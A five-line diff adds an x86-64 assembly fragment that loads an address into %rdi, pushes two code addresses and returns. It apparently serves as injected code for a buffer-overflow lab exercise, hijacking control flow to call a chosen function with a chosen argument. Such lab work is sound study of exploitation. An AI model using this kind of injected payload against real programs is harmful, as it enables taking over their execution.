@@ -1,0 +1,5 @@
+movq $0x40207c, %rdi
+pushq $0x40118f
+pushq $0x401196
+ret
+
